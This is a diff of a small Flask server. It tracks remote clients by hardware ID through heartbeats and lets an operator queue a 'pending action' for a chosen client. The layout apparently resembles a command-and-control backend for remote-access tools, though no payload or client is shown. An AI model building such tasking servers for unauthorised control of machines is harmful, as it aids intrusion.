@@ -1,70 +1,48 @@
-import os
-import json
-from flask import Flask, jsonify, request, render_template
-import firebase_admin
-from firebase_admin import credentials, firestore
+import time
+from flask import Flask, request, jsonify, render_template
 
 app = Flask(__name__)
 
-db = None
-try:
-    firebase_config_str = os.environ.get("FIREBASE_CONFIG_JSON")
-    if firebase_config_str:
-        cred_dict = json.loads(firebase_config_str)
-        cred = credentials.Certificate(cred_dict)
-        if not firebase_admin._apps:
-            firebase_admin.initialize_app(cred)
-        db = firestore.client()
-except Exception as e:
-    print(f"Firebase initialization error: {e}")
+# Dictionary para sa active clients (HWID ang key para iwas duplicate)
+clients = {}
 
 @app.route('/')
 def index():
     return render_template('index.html')
 
-@app.route('/api/clients', methods=['GET'])
-def get_clients():
-    try:
-        if not db:
-            return jsonify({}), 200
-        docs = db.collection('clients').stream()
-        clients = {}
-        for doc in docs:
-            clients[doc.id] = doc.to_dict()
-        return jsonify(clients), 200
-    except Exception as e:
-        return jsonify({"error": str(e)}), 500
-
 @app.route('/api/heartbeat', methods=['POST'])
 def heartbeat():
-    try:
-        data = request.get_json(silent=True) or {}
-        hwid = data.get("hwid")
-        ip = data.get("ip") or request.remote_addr
-        if hwid and db:
-            db.collection('clients').document(hwid).set({
-                "ip": ip,
-                "status": "ONLINE"
-            }, merge=True)
-        return jsonify({"status": "success"}), 200
-    except Exception as e:
-        return jsonify({"error": str(e)}), 500
+    data = request.json
+    hwid = data.get('hwid')
+    ip = data.get('ip')
+    if hwid:
+        # I-update o i-overwrite ang nag-iisang card para sa HWID na ito
+        clients[hwid] = {
+            "hwid": hwid,
+            "ip": ip,
+            "last_seen": time.time(),
+            "pending_action": clients.get(hwid, {}).get("pending_action", "")
+        }
+    return "", 200
+
+@app.route('/api/clients')
+def get_clients():
+    now = time.time()
+    # Kusang tanggalin sa listahan ang mga hindi nag-heartbeat ng mahigit 30 segundo
+    offline_nodes = [hwid for hwid, info in clients.items() if now - info["last_seen"] > 30]
+    for hwid in offline_nodes:
+        del clients[hwid]
+        
+    return jsonify(clients)
 
 @app.route('/api/target-action', methods=['POST'])
 def target_action():
-    try:
-        data = request.get_json(silent=True) or {}
-        hwid = data.get("hwid")
-        action = data.get("action")
-        if hwid and db:
-            db.collection('clients').document(hwid).update({
-                "pending_action": action
-            })
-            return jsonify({"message": "Action updated successfully"}), 200
-        return jsonify({"message": "Invalid HWID"}), 400
-    except Exception as e:
-        return jsonify({"error": str(e)}), 500
+    data = request.json
+    hwid = data.get('hwid')
+    action = data.get('action', '')
+    if hwid in clients:
+        clients[hwid]["pending_action"] = action
+    return "", 200
 
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=5000)
